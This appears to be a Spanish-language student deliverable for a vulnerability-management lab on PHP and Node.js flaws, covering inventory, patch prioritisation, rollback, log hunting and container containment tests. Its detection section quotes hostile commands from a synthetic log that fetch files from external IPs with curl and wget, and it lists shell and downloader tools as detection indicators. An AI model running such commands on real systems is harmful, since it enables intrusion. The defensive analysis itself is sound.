# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 04 · **Fork del grupo:** https://github.com/LoLoo03/goys-2026-tp-vulnerabilidades · **Rama:** `grupo-04`
**Fecha del taller:** jueves 29/10/2026 · **Revisión documental local:** 01/11/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Lorenzo Bellomo | LoLoo03 | Inventario, cambios/parche, detección, contención/comunicación |
| Agustin Ignacio Kloster | AgusKlos | Revisión de `entrega.md` y `deteccion.md`, preparación del comité |
| Naim Guarino | naimguar | Re-ejecución del laboratorio (01/11): pruebas de comportamiento de contención, pruebas funcionales y revisión de `deteccion.md` |
| Valentino Siadore | valentinosiadore | Revisión documental (01/11) de `entrega.md` y `deteccion.md` contra el contexto actualizado de la cátedra: pregunta 3 del comité, plazos KEV, riesgo de DoS y limitaciones de la regla. No levantó el laboratorio |

> El taller en el aula (29/10) lo ejecutó un solo integrante, Lorenzo Bellomo; por eso
> concentra los cuatro roles, y su `informe.md` lo refleja. La revisión posterior
> (30/10), a cargo de Agustin Ignacio Kloster, se hizo sobre el código del laboratorio,
> `audit.log` y las capturas, **sin volver a levantar el laboratorio**: lo que agrega
> esa revisión es análisis, no evidencia nueva de ejecución.
> Las horas están en UTC (reloj de Docker); en Argentina son UTC−3.

---

## Alcance de esta revisión

Esta propuesta conserva los aportes identificados de Lorenzo Bellomo y Agustin
Ignacio Kloster. No incorpora nuevas pruebas de laboratorio ni acredita la
participación de otro integrante. Se revisaron los documentos y las evidencias
publicadas en la rama `grupo-04`, commit
`0ba3296bc49d887d2575ba7863c49c041f705f26`. Las decisiones propuestas se actualizan
con el [contexto de la cátedra al 29/10](https://github.com/rodriguezemautn/goys-2026-tp-vulnerabilidades/blob/23cbf681a31ef661d5de3e0a48bee09bf929f718/recursos/contexto.md),
revisión `23cbf681a31ef661d5de3e0a48bee09bf929f718`: se conserva la evidencia
histórica del taller y no se presenta esta actualización como nueva ejecución.

Se distinguen tres planos: **capturas del laboratorio**, **eventos del log sintético**
y **decisiones propuestas para una organización ficticia**. Los hosts del log no
son evidencia de intrusión en los contenedores ejecutados por el grupo. Las versiones
destino y la cronología describen el taller de octubre, no una recomendación permanente
para cualquier instalación futura.

**Re-ejecución del 01/11 (Naim Guarino).** Posterior a la revisión documental, se
volvió a levantar el laboratorio de la cátedra en otro equipo, sin intercepción
HTTPS, con `./scripts/arrancar-2h.sh` y `./scripts/parchear.sh` **sin
modificaciones**. Se corrieron pruebas de comportamiento de los controles y pruebas
funcionales con contenido benigno, antes y después del parche, siempre dentro de
`labnet` y sin publicar puertos ni ejecutar PoCs
([`08`](capturas/08-contencion-pruebas-antes.txt) a
[`13`](capturas/13-memoria-tmp-capabilities.txt)). Esta evidencia es **nueva y
posterior al taller**: se marca como tal donde se usa y no reemplaza a las capturas
del 29/10. Diferencias de entorno declaradas: otro equipo, con Docker Desktop sobre
**arm64** (kernel `6.10.14-linuxkit`), así que las imágenes son de otra arquitectura
que las del taller ([`16`](capturas/16-kernel-y-arquitectura.txt)); `php.ini` ya
tenía la mitigación (`upload_progress = 0`) commiteada en la rama. Ninguna prueba
depende de la arquitectura, porque no se ejecutan PoCs.

## 1. Inventario

Evidencia: [`capturas/01-inventario-antes.txt`](capturas/01-inventario-antes.txt)
(`docker compose ps` + `./scripts/inventario.sh`, 2026-10-29T22:47:09Z) y
[`capturas/02-detectar.txt`](capturas/02-detectar.txt) (árbol de procesos).

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP (`php-lab`, web01) | PHP 8.3.35, Apache + mod_php | No en el lab / Sí en el despliegue supuesto | Sí: formulario con sesiones y subida de archivos | **Sí** (PHP2Shell, CVE-2026-109618/109619; corregido en 8.3.36) | `PHP 8.3.35 (cli)`; `session.upload_progress.enabled=1`; imagen `php:8.3.35-apache`; `docker top` muestra `apache2 -DFOREGROUND` (master root + workers www-data), sin `php-fpm` |
| API Node.js (`node-lab`, api01) | Node v22.23.3, brotli 1.1.0 (del runtime), Express 5 | No en el lab / Sí en el despliegue supuesto | Sí: `POST /decode` recibe cuerpos `Content-Encoding: br` de clientes; el decoder corre en body-parser (`express.raw`) antes del handler | **Sí** (Node2Shell, CVE-2026-111497; corregido en 22.23.4) | `v22.23.3 / brotli 1.1.0`; `npm ls` sin paquete brotli externo: el decoder lo aporta el runtime |
| Servicio Python (`py-lab`, svc01) | Python 3.11.18, brotli 1.0.9 (PyPI) | No | Parcial: decodifica `br` de lo que le llega por la red interna | **Sí** (CVE-2026-111497; brotli 1.0.3–1.2.0 afectado, corregido en 1.0.10 / 1.1.1 / 1.2.1) | `brotli 1.0.9` |

**SAPI de PHP.** `inventario.sh` corre `php -v` por CLI, así que muestra `(cli)`. El
SAPI web se deduce de la imagen `-apache` y del árbol de procesos: solo hay
`apache2`, sin `php-fpm`, por lo tanto PHP corre como módulo de Apache (mod_php), el
caso de **mayor riesgo** según el aviso: el ataque ocurre antes de que corra la app.
No imprimimos el SAPI web directamente (la página `index.php` lo muestra, pero no hay
puertos publicados y la guía no incluye un comando para pedirla). En la sección 3
dejamos el comando que lo haría, sin ejecutar.

**Brotli en Node: el string no alcanza como evidencia.** El runtime informa brotli
1.1.0 en la versión vulnerable y sigue informando 1.1.0 en la corregida
(ver sección 3). La señal válida es la versión de Node (22.23.4), no el string.

**Dónde se decodifica Brotli en la API.** `server.js` usa `express.raw()` en
`POST /decode`. En Express 5, `express.raw` es body-parser 2, que por defecto
(`inflate: true`) **ya descomprime** los cuerpos con `Content-Encoding: br` antes de
que corra el handler (`recursos/contexto.md`, "Cómo llega al decoder"). En la
revisión del 30/10 esto era una deducción del código; el 01/11 se **probó** con
cuerpos benignos ([`09-funcional-antes.txt`](capturas/09-funcional-antes.txt),
pruebas D, F e I; body-parser 2.4.0). Consecuencias:

- El decoder vulnerable se alcanza en body-parser aunque el handler no hiciera nada
  con Brotli. Sacar `brotliDecompressSync` del handler no saca a la API del alcance.
- **Doble decodificación, verificada:** un cuerpo `brotli(brotli("hola node"))` con
  `Content-Encoding: br` devuelve `200 hola node` (prueba F). Body-parser quita una
  capa y el handler la otra: los datos del cliente pasan **dos veces** por el
  decoder. Un `POST /decode` legítimo con una sola capa `br` responde
  `400 brotli invalido` (prueba D): es un bug funcional, ajeno al CVE.
- **La respuesta de error delata el decoder:** un cuerpo que no es Brotli con
  `Content-Encoding: br` devuelve `400` con el stack trace de Express
  (`Error: Decompression failed … BrotliDecoder.zlibOnError`) porque `NODE_ENV` no
  está definido (prueba I). Le confirma a un tercero, sin autenticarse, que su
  contenido llega al decoder Brotli del runtime: es justo el dato que necesita para
  apuntar Node2Shell. Corrección propuesta, no aplicada al lab: `NODE_ENV=production`
  o un manejador de errores propio que no devuelva la traza.
- **Matiz:** body-parser solo lee el cuerpo si la petición trae `Content-Type`
  (con `type: '*/*'`, `type-is` exige que el encabezado exista). Sin
  `Content-Type`, el cuerpo no se decodifica en body-parser y `server.js` responde
  `400` porque `req.body` llega `undefined` (prueba H). No es una defensa: el
  atacante elige los encabezados.

**Supuestos de exposición:**

- En el laboratorio ningún servicio está expuesto: no hay `ports:` publicados y la red
  `labnet` es `internal: true` (verificado en sección 5).
- En el despliegue real que simula el lab suponemos que el **portal PHP** está
  publicado a Internet (es un portal de legajos con subida de archivos) y que la
  **API Node** recibe cuerpos de clientes externos detrás de un proxy que **no**
  descomprime ni filtra `Content-Encoding: br`. El **servicio Python** es interno y
  solo recibe tráfico de otros servicios.
- Si el proxy descomprimiera Brotli, el proxy pasaría a ser el activo afectado
  (Envoy/Istio están en la lista del aviso) y habría que inventariarlo.
- El log de la sección 4 menciona un host **db01** que no está en este inventario:
  es un activo sin relevar.

**Ajuste de entorno (declarado):** el equipo donde corre el laboratorio tiene
Kaspersky Endpoint Security, que intercepta HTTPS y re-firma los certificados con su
propia CA (*Kaspersky Endpoint Security Personal Certification Authority*). Windows
confía en esa CA, pero los contenedores no, así que `./scripts/arrancar-2h.sh`
falló al construir la imagen de Node (`npm install` → `SELF_SIGNED_CERT_IN_CHAIN`).
Cambiar de red no lo resolvió, porque la intercepción ocurre en el propio equipo.
Las imágenes `goys-vuln-lab-node` se construyeron con una copia del `Dockerfile` de
la cátedra que solo agrega esa CA durante `npm install` (ver sección 3). No se
modificó `docker-compose.yml`, el código del laboratorio, `docs/` ni `recursos/`.
Las imágenes de PHP y Python se obtuvieron sin cambios.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 (CVSS 4.0) | **Sí**: confirmada, en CISA KEV desde 26/10 | Alta (supuesto: publicado, mod_php) | Alta: datos de legajos de personal | **1.º — Ya.** Mitigación inmediata (`upload_progress = 0`) y parche a 8.3.36 en ventana de emergencia, **< 24 h** |
| API Node.js | 9.2 (Google, CNA) / High (Node.js) | **Sí**, según el contexto actualizado de la cátedra: KEV desde 27/10; no demuestra compromiso de api01 | Alta (supuesto: recibe `br` de clientes; Express 5 descomprime) | Media-alta | **Emergencia — < 24 h.** Actualizar a 22.23.4; mientras tanto, evaluar rechazo de `br` antes del decoder y comprobar su efectividad |
| Servicio Python | 9.2 (mismo CVE) | **Sí** para el CVE según la cátedra; el log no confirma ese vector en svc01 | Interna por diseño; el escenario sintético muestra comandos sospechosos | Media | **Emergencia — < 24 h en este escenario.** Actualizar brotli (1.0.10 o 1.2.1) y validar compatibilidad; contención inmediata ante señales corroboradas |

**Justificación actualizada:** PHP sigue primero por datos personales, exposición
supuesta y criticidad. Node2Shell ya reúne la condición que antes habría disparado
la emergencia: el contexto de la cátedra informa explotación y KEV desde el 27/10.
La API no mantiene por tanto una ventana ordinaria de 72 horas. Python comparte
el componente afectado y presenta señales sospechosas en el escenario; también se
propone actualizarlo dentro de 24 horas, sin esperar para contener.

Los tres comparten plazo urgente, pero no tareas idénticas: dueños del portal, API
y servicio interno validan sus respectivas operaciones. El rechazo de Brotli es
una compensación propuesta, no un control desplegado ni una razón para posponer
sin pruebas. Los datos de explotación se atribuyen al contexto actualizado; los
eventos del log no identifican por sí solos un CVE.

**Por qué < 24 h y no "antes del vencimiento KEV".** Cada entrada del catálogo KEV
trae una fecha límite: Node2Shell vence el **10/11** y Fragnesia el **31/10**, con
triage forense (contexto de la cátedra, §2 y §3). Esa fecha es obligatoria para
agencias federales de EE. UU.; para nuestra organización ficticia la tomamos como
**techo**, no como objetivo. Nuestro plazo es más corto porque además de KEV hay
datos personales en el portal, exposición supuesta a Internet y señales en el log del
escenario. Si alguna de esas tres condiciones no se cumpliera, el techo KEV seguiría
valiendo. Fragnesia es el caso más ajustado: al 29/10 quedaban dos días y el kernel del
entorno del taller no se relevó (§5), así que su evaluación no puede esperar al cierre
de los parches de aplicación.

**Qué evidencia cambiaría el orden:**

- Compromiso real corroborado, acceso a datos o movimiento lateral en cualquier
  activo: respuesta al incidente inmediata, por delante del orden de parcheo.
- Exposición diferente del supuesto, o un proxy que descomprima `br`: revisar qué
  componente recibe el contenido y ampliar el inventario antes de afirmar cobertura.
- Evidencia de aplicabilidad de Fragnesia en el kernel Linux del entorno Docker:
  incorporar el tratamiento del host, no limitar el cierre a las imágenes de aplicación.

**Esta señal aparece en el escenario sintético.** [`deteccion.md`](deteccion.md)
identifica comandos anómalos en web01, api01 **y svc01** (27/10, 09:42–09:45 UTC).
La matriz anterior ordena el tratamiento de vulnerabilidades. Ante registros
reales equivalentes, autentificados y sin explicación autorizada, se activaría
además la respuesta a incidentes; no se esperaría al plazo de parcheo:

| Paso | Activo | Acción | Plazo |
|---|---|---|---|
| 0 | web01, api01, svc01 | Tratar como incidente: aislar de la red, preservar evidencia (memoria, disco, logs) y rotar los secretos accesibles desde esos servicios | Inmediato, antes de parchear |
| 0 | db01 | Identificar las sesiones SSH de 09:42–09:49 (usuario, origen, método). Si no se explican, se suma al incidente | Inmediato |
| 1–3 | Los tres | Parchear según la matriz, **reconstruyendo desde imágenes limpias** y no sobre el contenedor comprometido | Plazos de la matriz |

- Parchear un servicio comprometido cierra la entrada, pero no saca al atacante.
  Por eso el aislamiento va primero.
- **svc01 comparte la ventana de emergencia.** Su ubicación interna no elimina el
  riesgo: el `uname -a` sintético justifica investigación, no demuestra movimiento
  lateral. La actualización propuesta pasa a **< 24 h**, como la API; no se atribuye
  esta decisión a un nuevo resultado del laboratorio.
- El log no permite atribuir el acceso a uno u otro CVE. La explotación descrita por
  la cátedra modifica la prioridad preventiva, no la certeza de compromiso por host.

En el laboratorio, como el costo era bajo y no hay usuarios reales, aplicamos los tres
parches en la misma sesión; el orden de arriba es el que aplicaríamos en producción.

---

## 3. Mitigación, parche y reversión

| Fecha/hora (UTC) | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 29/10/2026, antes del taller | Entorno (build de API Node.js) | Build de `goys-vuln-lab-node:22.23.3-bookworm-slim` y `:22.23.4-bookworm-slim` con un `Dockerfile` temporal que confía en la CA de Kaspersky (comando abajo) | `npm install` fallaba con `SELF_SIGNED_CERT_IN_CHAIN`; el lab no arrancaba | `./scripts/arrancar-2h.sh`: `php-lab`, `node-lab` y `py-lab` en `healthy`; inventario: PHP 8.3.35, Node v22.23.3 / brotli 1.1.0, Python brotli 1.0.9 | `docker rmi goys-vuln-lab-node:22.23.3-bookworm-slim goys-vuln-lab-node:22.23.4-bookworm-slim` y reconstruir con `docker compose --env-file versions.env build` en un equipo sin intercepción HTTPS |
| 2026-10-29 22:47:58Z | Portal PHP | **Mitigación:** `laboratorio/php/php.ini`: `session.upload_progress.enabled = 1` → `0`; `docker compose restart php-lab` | `session.upload_progress.enabled=1` | `session.upload_progress.enabled=0`; `php-lab` `healthy` a los 8 s ([`04-mitigacion-php.txt`](capturas/04-mitigacion-php.txt)) | Restaurar `1` y reiniciar solo en una reversión autorizada y aislada; no retirar esta mitigación mientras el riesgo siga abierto |
| 2026-10-29 22:48:26Z | Los tres | **Intento de parche** con `./scripts/parchear.sh` | Versiones vulnerables | **Falló** el rebuild de Node por la intercepción de Kaspersky (`SELF_SIGNED_CERT_IN_CHAIN`); no se recreó ningún contenedor ([`05-parchear-intento.txt`](capturas/05-parchear-intento.txt)) | No aplica: no cambió nada |
| 2026-10-29 22:53:11Z | Los tres | **Parche** con las mismas variables que `parchear.sh`, sin reconstruir Node (comando abajo) | PHP 8.3.35, Node v22.23.3, brotli (Py) 1.0.9 | PHP **8.3.36**, Node **v22.23.4**, brotli (Py) **1.2.1**; los 3 `healthy`; la mitigación de PHP sigue en `0` ([`06-parche-despues.txt`](capturas/06-parche-despues.txt)) | `docker compose --env-file versions.env up -d --wait`: `versions.env` vuelve a las versiones anteriores, cuyas imágenes siguen en el equipo. Mantener `upload_progress = 0` y el aislamiento; no devolver versiones vulnerables al tráfico externo |
| 2026-11-01 17:08:50Z (re-ejecución) | Los tres | **Parche** con `./scripts/parchear.sh` **sin modificaciones**, en un equipo sin intercepción HTTPS | PHP 8.3.35, Node v22.23.3, brotli (Py) 1.0.9 | PHP **8.3.36**, Node **v22.23.4**, brotli (Py) **1.2.1**; los 3 `healthy`; el build de Node con el `Dockerfile` de la cátedra funcionó (`added 65 packages`). Pruebas funcionales A–I con el mismo resultado antes y después ([`10`](capturas/10-parchear-sh.txt), [`09`](capturas/09-funcional-antes.txt), [`11`](capturas/11-funcional-despues.txt)) | La de la fila siguiente, ensayada |
| 2026-11-01 17:12:00Z (re-ejecución) | Los tres | **Ensayo de reversión** y re-aplicación del parche | PHP 8.3.36, Node v22.23.4, brotli 1.2.1 | `docker compose --env-file versions.env up -d --wait` volvió a 8.3.35 / v22.23.3 / 1.0.9 con los 3 `healthy` en ~5 s; `upload_progress` siguió en `0`. Se re-aplicó `parchear.sh` y se apagó el lab con `down -v` ([`14`](capturas/14-reversion-y-apagado.txt)) | No aplica: es el ensayo |

**Parche aplicado (equivalente a `parchear.sh`).** `parchear.sh` exporta
`PHP_TAG=8.3.36-apache`, `NODE_TAG=22.23.4-bookworm-slim` y `BROTLI_VERSION=1.2.1` y
corre `docker compose --env-file versions.env up -d --build`. El `--build` vuelve a
construir Node con el `Dockerfile` original, que falla en este equipo. Se usaron las
mismas variables, se construyó solo Python y se levantó sin `--build`, usando la
imagen de Node 22.23.4 ya construida con el ajuste de Kaspersky:

```bash
export PHP_TAG=8.3.36-apache NODE_TAG=22.23.4-bookworm-slim BROTLI_VERSION=1.2.1
docker compose --env-file versions.env build py-lab
docker compose --env-file versions.env up -d --wait
./scripts/inventario.sh
```

**Condiciones para revertir.** La reversión anterior reproduce el estado del taller,
no garantiza un estado seguro. Si una actualización rompe una operación crítica,
el responsable del servicio y seguridad deben registrar el motivo, preservar la
evidencia y decidir entre mantener el servicio suspendido o recuperar una imagen
limpia conocida bajo aislamiento y controles compensatorios. Una imagen anterior
sospechada de compromiso no es un respaldo confiable. No restaurar secretos expuestos
ni reabrir tráfico únicamente porque el healthcheck pase. Validar la operación que
falló y fijar responsable y vencimiento del riesgo residual. La reversión técnica se **ensayó**
el 01/11 en el laboratorio (tabla anterior, ~5 s, los 3 `healthy`); lo que no se
ensayó es el procedimiento organizativo (registro, decisión, imagen limpia), que no
tiene equivalente en el lab.

**Límite de la mitigación PHP.** Desactivar `session.upload_progress.enabled` reduce
rutas concretas, pero no reemplaza el parche ni cubre todas las variantes. No se
presenta como protección completa frente a ambos CVE. Fuente:
[aviso oficial PHP del 21/10](https://www.php.net/archive/2026.php#2026-10-21-5).

**Ventana de cambio.** En el lab, el corte fue de unos segundos por servicio
(recreación de contenedores). En producción, PHP va en ventana de emergencia el mismo
día; API y Python también pasan a ventana de emergencia **< 24 h** por el contexto
actualizado y las señales del escenario (§2). Son plazos propuestos para producción,
no nuevos tiempos medidos ni nuevas pruebas del taller.

**Versión destino de brotli en Python.** El aviso corrige en 1.0.10, 1.1.1 y 1.2.1.
`parchear.sh` sube de 1.0.9 a 1.2.1, que es un salto de rama. En producción, el
cambio mínimo y de menor riesgo de compatibilidad sería 1.0.10, dentro de la misma
rama 1.0.x. En el lab se usó 1.2.1 porque es lo que define la cátedra.

**Detalle del ajuste de entorno (Kaspersky).** La CA se exportó del almacén de
certificados raíz de Windows a un archivo PEM (`kaspersky-ca.crt`) fuera del repo.
No se commitea: es específica de este equipo. El `Dockerfile` temporal, también fuera
del repo, es el de `laboratorio/node/Dockerfile` con una sola diferencia en el paso
de `npm install`:

```dockerfile
ARG NODE_TAG=22.23.3-bookworm-slim
FROM node:${NODE_TAG}

WORKDIR /app

COPY package.json ./
COPY --from=ca kaspersky-ca.crt /tmp/kaspersky-ca.crt
RUN NODE_EXTRA_CA_CERTS=/tmp/kaspersky-ca.crt npm install --omit=dev && rm /tmp/kaspersky-ca.crt

COPY server.js ./

USER node
EXPOSE 3000
CMD ["node", "server.js"]
```

Comando, desde `laboratorio/`, una vez por versión (`22.23.3-bookworm-slim` y
`22.23.4-bookworm-slim`):

```bash
docker buildx build --load -f <dir-temporal>/Dockerfile.kaspersky \
  --build-context ca=<dir-temporal> \
  --build-arg NODE_TAG=<version> \
  -t goys-vuln-lab-node:<version> ./node
```

La verificación TLS no se desactivó: npm sigue validando el certificado, pero contra
la CA de Kaspersky. La CA se borra de la imagen al terminar la instalación.

**Prueba funcional mínima:** después de la mitigación y después del parche, los tres
servicios pasaron su healthcheck (`docker compose ps` → `healthy`). El alcance de esa
prueba no es el mismo en los tres:

- Node: `fetch('http://127.0.0.1:3000/')` y exige respuesta `ok`. Ejecuta la ruta `/`
  de Express: prueba la app.
- Python: `urlopen('http://127.0.0.1:8000/')`. Ejecuta `do_GET`, que consulta el
  módulo `brotli`: prueba la app.
- PHP: `php -r` con `fsockopen('127.0.0.1', 80)`. Solo comprueba que Apache **acepta
  conexiones TCP**, y lo hace desde el PHP de **CLI**. No prueba que mod_php
  interprete `index.php`: un Apache con el módulo PHP roto pasaría igual.

En PHP, entonces, el healthcheck es más débil que en los otros dos. El comando
siguiente lo cierra sin publicar puertos ni salir de la red, porque pide la página
por loopback dentro del mismo contenedor. Se identificó en la revisión del 30/10 y
se **ejecutó el 01/11**:

```bash
docker compose exec -T php-lab php -r 'echo file_get_contents("http://127.0.0.1/");' \
  | grep -A1 -E 'PHP:|SAPI:|upload_progress'
```

Resultado: antes del parche `8.3.35`, después `8.3.36`; en ambos casos SAPI
**`apache2handler`** y `upload_progress.enabled` en `0`
([`09`](capturas/09-funcional-antes.txt) y [`11`](capturas/11-funcional-despues.txt),
prueba A). Esto confirma por la vía directa el SAPI web que la sección 1 había
deducido del árbol de procesos: mod_php.

**Pruebas funcionales del 01/11** (mismo resultado antes y después del parche):

| Prueba | Qué hace | Resultado |
|---|---|---|
| A | `index.php` por loopback | Versión, `apache2handler`, `upload_progress=0` |
| B | Formulario de subida con un `.txt` benigno (`curl -F` dentro de `php-lab`) | `Archivo recibido: prueba.txt`: la mitigación no rompe la subida |
| C | `POST /decode` sin compresión, desde `py-lab` | `hola node` |
| D | `POST /decode` con una capa `br` benigna | `400 brotli invalido` (bug de doble decodificación, §1) |
| E | `POST` a `py-lab` con `br` benigno, desde `node-lab` | `200 hola python` |

**Qué no se pudo probar:**

- Que la mitigación y el parche **cierren** la vulnerabilidad: no se ejecutan PoCs.
  Lo verificado es la versión y la configuración, que es lo que indica el aviso.
- ~~El formulario de subida de PHP y `POST /decode` con un cuerpo Brotli benigno~~:
  **probado el 01/11** desde dentro de `labnet` (pruebas B a E). Siguen sin probarse
  desde fuera, porque los servicios no publican puertos y no se cambia la red.
- Que la mitigación de PHP no rompa una funcionalidad **de una app real**: en el lab
  la subida sigue funcionando (prueba B), pero la app no usa la barra de progreso de
  subida; en una app que la use, desactivar `upload_progress` la rompe.
- ~~Que las imágenes de Node construidas con el `Dockerfile` de la cátedra, sin el
  ajuste de Kaspersky, se comporten igual~~: **probado el 01/11**. En otro equipo,
  `parchear.sh` sin cambios construyó las dos imágenes y dio las mismas versiones y
  resultados funcionales.

---

## 4. Detección y caza

Resumen; el análisis completo está en [`deteccion.md`](deteccion.md). Evidencia:
[`capturas/02-detectar.txt`](capturas/02-detectar.txt).

**Hipótesis:** si PHP2Shell o Node2Shell se explotaron, en web01, api01 o svc01 vamos
a ver al proceso del servicio (`apache2`, `node`, `python`) lanzando un shell o un
descargador (`sh`, `bash`, `curl`, `wget`, `nc`) a partir del 17/10 según la cronología del escenario, con comandos de
reconocimiento (`id`, `uname`) o URLs a IPs externas.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| 2026-10-27T09:42:17Z / :18Z | web01 | `apache2` → `sh -c id` → `id` | **Sí** | Shell de reconocimiento inesperado; el evento no acredita UID, autorización ni CVE concreto |
| 2026-10-27T09:43:03Z / :04Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | La API no usa `child_process`; intento de descarga con resultado desconocido |
| 2026-10-27T09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Otro intento de descarga desde web01, a una IP del rango de documentación |
| 2026-10-27T09:45:10Z / :11Z | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento en el servicio **interno**: posible movimiento lateral |
| 09:42:40Z, 09:44:10Z, 09:49:00Z | db01 | `sshd` → `-bash` | Indeterminado | Puede ser una sesión administrativa; coincide con la ventana del ataque y db01 no está inventariado |
| 09:45:00Z, 09:47:00Z / 09:43:40Z | api01 / svc01 | `node` → `node server.js` / `python` → `python app.py` | Baja, a confirmar | Mismo binario y argumentos del servicio: compatible con un reinicio o supervisor. Pero rodean a los hallazgos de api01 y svc01 y podrían ser intentos fallidos que tiraron el proceso (`deteccion.md` §2.2) |

**¿Hay compromiso?** En el escenario sintético hay señales suficientes para tratar
web01, api01 y svc01 como un incidente presunto. El log registra creación de procesos
anómalos, no confirma el vector, la autorización ni el resultado de las descargas.
No demuestra compromiso de los contenedores del taller. La secuencia orienta la
investigación, pero no prueba automatización ni un mismo atacante. El alcance y
las sesiones de db01 requieren evidencia adicional.

**Regla propuesta para Node.js:** alertar en api01 cuando el padre directo sea
`node` y el hijo esté en la lista de `deteccion.md` §4. El contraste documental
selecciona la línea 9; no demuestra una alerta desplegada. La lista incluye
`python`; los binarios no listados, la ejecución en memoria y los intermediarios
pueden quedar fuera. La contención se decide con contexto, no se afirma aislamiento
automático por una coincidencia del archivo.

**Limitaciones del log:** no trae usuario/UID ni IP de origen de la conexión, ni
resultado del comando; cubre solo 9 minutos del 27/10 (nada desde el 17/10, cuando
empezaron los intentos); no hay telemetría de red para ver si la salida a
`198.51.100.x` funcionó.

**Logs de los servicios del lab (01/11):** el access log de Apache queda en un
`tmpfs` que no llega a `docker compose logs` y **se borra al reiniciar** `php-lab`
(medido: 81 bytes → 0). El `docker compose restart php-lab` de la mitigación del
29/10 habría borrado esa evidencia: antes de reiniciar un servicio sospechoso hay
que copiar sus logs. Node no registra accesos; Python sí registra la IP de origen
([`deteccion.md`](deteccion.md) §5,
[`capturas/15`](capturas/15-logs-de-servicio.txt)).

**Árbol de procesos capturado al cierre del taller:** sin hijos sospechosos. En `node-lab` aparece
`node -e fetch(...)`, pero es el healthcheck de Docker: su padre es el runtime del
contenedor, no `node server.js`, así que la regla no lo dispara
([`07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)).

---

## 5. Contención

Evidencia: [`capturas/03-contencion-antes.txt`](capturas/03-contencion-antes.txt) y
[`capturas/07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)
(`./scripts/verificar-contencion.sh`, `docker compose config`, `./scripts/detectar.sh`).

| Control | Configuración | Evidencia | ¿Funciona? | Qué daño evita |
|---------|---------------|-----------|:----------:|----------------|
| Red sin salida | `networks.labnet.internal: true`, sin `ports:` | `SIN SALIDA` en PHP, Node (`TypeError`) y Python (`URLError`), antes y después del parche | Configurado; pruebas de salida sin respuesta exitosa | Busca limitar descargas, exfiltración y comunicación externa; las pruebas no acreditan bloqueo de todo destino o protocolo |
| Usuario sin privilegios | `user: node` (Node), `user: nobody` (Python); Apache: master `root`, workers `www-data` | 29/10: `docker top`. 01/11: `id` → `uid=1000(node)`, `uid=65534(nobody)`; en PHP, `/proc/*/status` muestra el master con UID 0 y los 5 workers con UID 33 ([`08`](capturas/08-contencion-pruebas-antes.txt) §1, [`13`](capturas/13-memoria-tmp-capabilities.txt) §11) | **Sí, probado** (Node, Python) / Parcial (PHP) | Reduce privilegios, pero un RCE aún puede acceder a datos y credenciales legibles por la cuenta del servicio. En PHP las peticiones las atiende un worker `www-data`; el master root no procesa contenido de clientes, pero existe |
| Filesystem read-only | `read_only: true` + `tmpfs` en `/tmp` (y rutas de Apache) | 01/11: escribir en `/var/www/html`, `/usr/local/bin`, `/app` falla en los 3 (`Read-only file system`, `EROFS`); `/tmp` es escribible pero montado **`noexec`**: un binario copiado ahí da `Permission denied` ([`08`](capturas/08-contencion-pruebas-antes.txt) §2, [`13`](capturas/13-memoria-tmp-capabilities.txt) §10) | **Sí, probado** | Impide dejar una webshell en el código o reemplazar binarios, y que un binario descargado se ejecute desde `/tmp`. **Residual medido:** `sh /tmp/s.sh` sí corre (el intérprete no está en `/tmp`), y la ejecución en memoria no se ve afectada. `tmpfs` no persiste al recrear el contenedor |
| Capabilities mínimas | `cap_drop: ALL`; PHP recupera solo `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`; `no-new-privileges:true` | 01/11: `/proc/self/status` → Node y Python `CapEff 0`, `CapBnd 0`; PHP master `CapEff 0x4c3` (exactamente esas 5) y workers `CapEff 0`; `NoNewPrivs: 1` en los 3 ([`08`](capturas/08-contencion-pruebas-antes.txt) §3, [`13`](capturas/13-memoria-tmp-capabilities.txt) §11) | **Sí, probado** | Sin capacidades de red cruda, montaje ni administración; `no-new-privileges` bloquea escalar con binarios setuid. Un RCE en un worker PHP no hereda las 5 capabilities del master |
| Límite de PIDs | `pids_limit` 100 / 100 / 50 | 01/11: en `py-lab` (límite 50) se lanzaron 60 `sleep`; el proceso 49 falló con `BlockingIOError: Resource temporarily unavailable` y el servicio siguió `healthy` ([`08`](capturas/08-contencion-pruebas-antes.txt) §4) | **Sí, probado** | Corta un fork bomb o un reparto masivo de procesos sin tumbar al host |
| Límite de memoria | `mem_limit` 256 MB (PHP, Node) / 128 MB (Python), **sin** `memswap_limit` | 01/11: en `py-lab` una reserva de **200 MB funcionó** pese al límite de 128 MB; una de 300 MB terminó con `exit 137` (`oom_kill 1`) y el servicio siguió `healthy`. `docker inspect`: `MemorySwap=268435456`; `memory.swap.max` = 128 MB ([`08`](capturas/08-contencion-pruebas-antes.txt) §5, [`13`](capturas/13-memoria-tmp-capabilities.txt) §9) | **Parcial, probado** | Acota minería y agotamiento de memoria, pero el tope real es **el doble** del declarado: sin `memswap_limit`, Docker suma la misma cantidad de swap. Corrección propuesta para producción: `memswap_limit` igual a `mem_limit`. No se cambia el compose del lab |
